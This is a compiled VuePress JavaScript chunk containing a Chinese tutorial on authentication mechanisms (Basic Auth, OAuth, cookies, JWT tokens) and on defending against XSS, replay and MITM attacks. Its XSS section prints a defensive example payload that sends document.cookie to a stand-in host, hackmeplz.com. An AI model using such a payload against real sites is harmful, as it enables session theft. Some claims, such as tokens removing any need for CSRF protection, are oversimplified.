(window.webpackJsonp=window.webpackJsonp||[]).push([[79],{404:function(t,s,a){"use strict";a.r(s);var e=a(3),r=Object(e.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"几种常用的认证机制"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#几种常用的认证机制"}},[t._v("#")]),t._v(" 几种常用的认证机制")]),t._v(" "),a("h2",{attrs:{id:"一、http-basic-auth"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#一、http-basic-auth"}},[t._v("#")]),t._v(" 一、HTTP Basic Auth")]),t._v(" "),a("p",[t._v("HTTP Basic Auth简单点说明就是每次请求API时都提供用户的username和password，简言之，Basic Auth是配合"),a("code",[t._v("RESTful API")]),t._v(" 使用的最简单的认证方式，只需提供用户名密码即可，但由于有把用户名密码暴露给第三方客户端的风险，在生产环境下被使用的越来越少。因此，在开发对外开放的"),a("code",[t._v("RESTful API")]),t._v("时，尽量避免采用HTTP Basic Auth")]),t._v(" "),a("h2",{attrs:{id:"二、oauth"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#二、oauth"}},[t._v("#")]),t._v(" 二、OAuth")]),t._v(" "),a("p",[t._v("OAuth（开放授权）是一个开放的授权标准，允许用户让第三方应用访问该用户在某一web服务上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。")]),t._v(" "),a("p",[t._v("OAuth允许用户提供一个令牌，而不是用户名和密码来访问他们存放在特定服务提供者的数据。每一个令牌授权一个特定的第三方系统（例如，视频编辑网站)在特定的时段（例如，接下来的2小时内）内访问特定的资源（例如仅仅是某一相册中的视频）。这样，OAuth让用户可以授权第三方网站访问他们存储在另外服务提供者的某些特定信息，而非所有内容\n下面是OAuth2.0的流程：")]),t._v(" "),a("p",[a("img",{attrs:{src:"/blog-vuepress/2021/0317/34831-20160622150107172-139099471.png",alt:""}})]),t._v(" "),a("p",[t._v("这种基于OAuth的认证机制适用于个人消费者类的互联网产品，如社交类APP等应用，但是不太适合拥有自有认证权限管理的企业应用")]),t._v(" "),a("h2",{attrs:{id:"三、cookie-auth"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#三、cookie-auth"}},[t._v("#")]),t._v(" 三、Cookie Auth")]),t._v(" "),a("p",[t._v("Cookie认证机制就是为一次请求认证在服务端创建一个Session对象，同时在客户端的浏览器端创建了一个Cookie对象；通过客户端带上来Cookie对象来与服务器端的session对象匹配来实现状态管理的。默认的，当我们关闭浏览器的时候，cookie会被删除。但可以通过修改cookie 的expire time使cookie在一定时间内有效")]),t._v(" "),a("h2",{attrs:{id:"四、token-auth"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#四、token-auth"}},[t._v("#")]),t._v(" 四、Token Auth")]),t._v(" "),a("p",[a("img",{attrs:{src:"/blog-vuepress/2021/0317/34831-20160622150124531-1416052185.png",alt:""}})]),t._v(" "),a("h3",{attrs:{id:"token-auth的优点"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#token-auth的优点"}},[t._v("#")]),t._v(" Token Auth的优点")]),t._v(" "),a("p",[t._v("Token机制相对于Cookie机制又有什么好处呢？")]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("支持跨域访问")]),t._v(": Cookie是不允许垮域访问的，这一点对Token机制是不存在的，前提是传输的用户认证信息通过HTTP头传输")]),t._v(" "),a("li",[a("strong",[t._v("无状态(也称：服务端可扩展行)")]),t._v(":Token机制在服务端不需要存储session信息，因为Token 自身包含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息")]),t._v(" "),a("li",[a("strong",[t._v("更适用CDN")]),t._v(": 可以通过内容分发网络请求你服务端的所有资料（如：javascript，HTML,图片等），而你的服务端只要提供API即可")]),t._v(" "),a("li",[a("strong",[t._v("去耦")]),t._v(": 不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要在你的API被调用的时候，你可以进行Token生成调用即可")]),t._v(" "),a("li",[a("strong",[t._v("更适用于移动应用")]),t._v(": 当你的客户端是一个原生平台（iOS, Android，Windows 8等）时，Cookie是不被支持的（你需要通过Cookie容器进行处理），这时采用Token认证机制就会简单得多")]),t._v(" "),a("li",[a("strong",[t._v("CSRF")]),t._v(":因为不再依赖于Cookie，所以你就不需要考虑对CSRF（跨站请求伪造）的防范")]),t._v(" "),a("li",[a("strong",[t._v("性能")]),t._v(": 一次网络往返时间（通过数据库查询session信息）总比做一次HMACSHA256计算 的Token验证和解析要费时得多")]),t._v(" "),a("li",[a("strong",[t._v("不需要为登录页面做特殊处理")]),t._v(": 如果你使用Protractor 做功能测试的时候，不再需要为登录页面做特殊处理")]),t._v(" "),a("li",[a("strong",[t._v("基于标准化")]),t._v(":你的API可以采用标准化的 JSON Web Token (JWT). 这个标准已经存在多个后端库（.NET, Ruby, Java,Python, PHP）和多家公司的支持（如：Firebase,Google, Microsoft）")])]),t._v(" "),a("h1",{attrs:{id:"基于jwt的token认证机制实现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#基于jwt的token认证机制实现"}},[t._v("#")]),t._v(" 基于JWT的Token认证机制实现")]),t._v(" "),a("h2",{attrs:{id:"jwt的组成"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#jwt的组成"}},[t._v("#")]),t._v(" "),a("strong",[t._v("JWT的组成")])]),t._v(" "),a("p",[t._v("一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名")]),t._v(" "),a("h3",{attrs:{id:"载荷（payload）"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#载荷（payload）"}},[t._v("#")]),t._v(" 载荷（Payload）")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"iss"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Online JWT Builder"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" \n  "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"iat"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1416797419")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" \n  "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"exp"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1448333419")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" \n  "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"aud"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"www.example.com"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" \n  "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"sub"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"jrocket@example.com"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" \n  "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"GivenName"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Johnny"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" \n  "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Surname"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Rocket"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" \n  "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Email"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"jrocket@example.com"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" \n  "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Role"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Manager"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Project Administrator"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br")])]),a("ul",[a("li",[t._v("iss: 该JWT的签发者，是否使用是可选的")]),t._v(" "),a("li",[t._v("sub: 该JWT所面向的用户，是否使用是可选的")]),t._v(" "),a("li",[t._v("aud: 接收该JWT的一方，是否使用是可选的")]),t._v(" "),a("li",[t._v("exp(expires): 什么时候过期，这里是一个Unix时间戳，是否使用是可选的")]),t._v(" "),a("li",[t._v("iat(issued at): 在什么时候签发的(UNIX时间)，是否使用是可选的")]),t._v(" "),a("li",[t._v("nbf (Not Before)：如果当前时间在nbf里的时间之前，则Token不被接受；一般都会留一些余地，比如几分钟；，是否使用是可选的")])]),t._v(" "),a("p",[t._v("将上面的JSON对象进行"),a("code",[t._v("se64编码]")]),t._v("可以得到下面的字符串。这个字符串我们将它称作JWT的Payload（载荷）")]),t._v(" "),a("h3",{attrs:{id:"头部（header）"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#头部（header）"}},[t._v("#")]),t._v(" "),a("strong",[t._v("头部（Header）")])]),t._v(" "),a("p",[t._v("JWT还需要一个头部，头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等。这也可以被表示成一个JSON对象")]),t._v(" "),a("h3",{attrs:{id:"签名（signature）"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#签名（signature）"}},[t._v("#")]),t._v(" "),a("strong",[t._v("签名（Signature）")])]),t._v(" "),a("p",[t._v("将上面的两个编码后的字符串都用句号.连接在一起（头部在前），就形成了")]),t._v(" "),a("p",[t._v("最后，我们将上面拼接完的字符串用HS256算法进行加密。在加密的时候，我们还需要提供一个密钥（secret）。如果我们用mystar作为密钥的话，那么就可以得到我们加密后的内容")]),t._v(" "),a("h2",{attrs:{id:"认证过程"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#认证过程"}},[t._v("#")]),t._v(" 认证过程")]),t._v(" "),a("ol",[a("li",[t._v("第一次认证：第一次登录，用户从浏览器输入用户名/密码，提交后到服务器的登录处理的Action层（Login Action）")]),t._v(" "),a("li",[t._v("Login Action调用认证服务进行用户名密码认证，如果认证通过，Login Action层调用用户信息服务获取用户信息（包括完整的用户信息及对应权限信息）")]),t._v(" "),a("li",[t._v("返回用户信息后，Login Action从配置文件中获取Token签名生成的秘钥信息，进行Token的生成")]),t._v(" "),a("li",[t._v("生成Token的过程中可以调用第三方的JWT Lib生成签名后的JWT数据")]),t._v(" "),a("li",[t._v("完成JWT数据签名后，将其设置到COOKIE对象中，并重定向到首页，完成登录过程")])]),t._v(" "),a("p",[a("img",{attrs:{src:"/blog-vuepress/2021/0317/34831-20160622152259735-1969767936.jpg",alt:""}})]),t._v(" "),a("h2",{attrs:{id:"对token认证的五点认识"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#对token认证的五点认识"}},[t._v("#")]),t._v(" 对Token认证的五点认识")]),t._v(" "),a("ul",[a("li",[t._v("一个Token就是一些信息的集合")]),t._v(" "),a("li",[t._v("在Token中包含足够多的信息，以便在后续请求中减少查询数据库的几率")]),t._v(" "),a("li",[t._v("服务端需要对cookie和HTTP Authrorization Header进行Token信息的检查")]),t._v(" "),a("li",[t._v("基于上一点，你可以用一套token认证代码来面对浏览器类客户端和非浏览器类客户端")]),t._v(" "),a("li",[t._v("因为token是被签名的，所以我们可以认为一个可以解码认证通过的token是由我们系统发放的，其中带的信息是合法有效的")])]),t._v(" "),a("h2",{attrs:{id:"安全问题"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#安全问题"}},[t._v("#")]),t._v(" 安全问题")]),t._v(" "),a("h3",{attrs:{id:"确保验证过程的安全性"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#确保验证过程的安全性"}},[t._v("#")]),t._v(" 确保验证过程的安全性")]),t._v(" "),a("p",[t._v("如何保证用户名/密码验证过程的安全性；因为在验证过程中，需要用户输入用户名和密码，在这一过程中，用户名、密码等敏感信息需要在网络中传输。因此，在这个过程中建议采用HTTPS，通过SSL加密传输，以确保通道的安全性")]),t._v(" "),a("h3",{attrs:{id:"如何防范xss-attacks"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#如何防范xss-attacks"}},[t._v("#")]),t._v(" 如何防范XSS Attacks")]),t._v(" "),a("p",[t._v("浏览器可以做很多事情，这也给浏览器端的安全带来很多隐患，最常见的如：XSS攻击：跨站脚本攻击(Cross Site Scripting)；如果有个页面的输入框中允许输入任何信息，且没有做防范措施，如果我们输入下面这段代码")]),t._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("img")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("src")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("x"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v(" a.src='https://hackmeplz.com/yourCookies.png/?cookies=’+document.cookie;return a}())\"\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("这段代码会盗取你域中的所有cookie信息，并发送到 hackmeplz.com；那么我们如何来防范这种攻击呢？")]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("XSS攻击代码过滤")])])]),t._v(" "),a("p",[t._v("移除任何会导致浏览器做非预期执行的代码，这个可以采用一些库来实现（如：js下的js-xss，JAVA下的XSS HTMLFilter，PHP下的TWIG）；如果你是将用户提交的字符串存储到数据库的话（也针对SQL注入攻击），你需要在前端和服务端分别做过滤")]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("采用HTTP-Only Cookies")])])]),t._v(" "),a("p",[t._v("通过设置Cookie的参数： HttpOnly; Secure 来防止通过JavaScript 来访问Cookie")]),t._v(" "),a("h3",{attrs:{id:"如何防范replay-attacks"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#如何防范replay-attacks"}},[t._v("#")]),t._v(" 如何防范Replay Attacks")]),t._v(" "),a("p",[t._v("所谓重放攻击就是攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程。比如在浏览器端通过用户名/密码验证获得签名的Token被木马窃取。即使用户登出了系统，黑客还是可以利用窃取的Token模拟正常请求，而服务器端对此完全不知道，以为JWT机制是无状态的")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("时间戳 +共享秘钥")])]),t._v(" "),a("li",[a("p",[t._v("时间戳 +共享秘钥+黑名单")])])]),t._v(" "),a("h3",{attrs:{id:"如何防范mitm-（man-in-the-middle）attacks"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#如何防范mitm-（man-in-the-middle）attacks"}},[t._v("#")]),t._v(" 如何防范MITM （Man-In-The-Middle）Attacks")]),t._v(" "),a("p",[t._v("所谓MITM攻击，就是在客户端和服务器端的交互过程被监听，比如像可以上网的咖啡馆的WIFI被监听或者被黑的代理服务器等；\n针对这类攻击的办法使用HTTPS，包括针对分布式应用，在服务间传输像cookie这类敏感信息时也采用HTTPS；所以云计算在本质上是不安全的")])])}),[],!1,null,null,null);s.default=r.exports}}]);